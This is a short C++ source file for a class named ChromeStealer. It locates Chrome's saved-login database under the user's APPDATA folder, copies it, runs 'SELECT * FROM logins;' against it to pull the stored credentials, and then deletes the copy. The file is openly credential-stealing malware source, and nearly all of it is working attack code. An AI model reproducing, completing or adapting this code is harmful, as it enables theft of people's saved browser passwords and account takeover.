#include "ChromeStealer.h"
#include <boost\compute\detail\getenv.hpp>
#include "StaticTools.h"
#include "SQLite3.hpp"

ChromeStealer::ChromeStealer() {
	appdata_path = std::string(boost::compute::detail::getenv("APPDATA"));
	path1 = boost::filesystem::path(appdata_path + CHROME_FILE);
}

ChromeStealer::~ChromeStealer() {
	
}

const bool ChromeStealer::canSteal(void) const
{
	return boost::filesystem::exists(path1);
}

const std::string ChromeStealer::stealPasswordList(void) const
{
	boost::filesystem::copy_file(path1, appdata_path + "\\Login Data", boost::filesystem::copy_option::overwrite_if_exists);
	std::string path = appdata_path + "\\Login Data";
	std::string ret;
	SQLite3 Sq(path);
	std::string q = "SELECT * FROM logins;";
	ret = Sq.execute(q);
	Sq.close();
	boost::filesystem::remove(appdata_path + "\\Login Data");
	return (ret);
}
